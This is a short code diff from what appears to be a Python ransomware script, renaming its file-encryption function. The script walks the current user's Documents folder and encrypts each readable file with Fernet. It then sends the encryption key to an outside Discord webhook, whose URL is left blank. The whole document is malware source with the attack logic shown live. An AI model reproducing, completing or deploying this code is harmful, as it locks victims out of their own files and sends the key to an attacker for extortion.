@@ -5,15 +5,15 @@ import subprocess
 import json
 
 
-"""Cipher function"""
-def cyp_folder(path, fernet):
+"""Encrypt function"""
+def enc_folder(path, fernet):
     for root, files in os.walk(path):
         for filename in files:
             filepath = os.path.join(root, filename)
             if not os.access(filepath, os.R_OK):
                 continue
             if "directory" in str(os.system(f"file {filepath}")):
-                cyp_folder(path=filepath, fernet=fernet)
+                enc_folder(path=filepath, fernet=fernet)
             with open(filepath, "rb") as f:
                 data = f.read()
             encrypted_data = fernet.encrypt(data)
@@ -38,5 +38,5 @@ USERNAME = subprocess.check_output(['whoami']).decode('ascii')
 INITIAL_PATH = f"/home/{USERNAME}/Documents/"
 WEBHOOK_URL = ''
 
-cyp_folder(path=INITIAL_PATH, fernet=FERNET)
+enc_folder(path=INITIAL_PATH, fernet=FERNET)
 send_key(username=USERNAME, key=KEY, discord_webhook_url=WEBHOOK_URL)
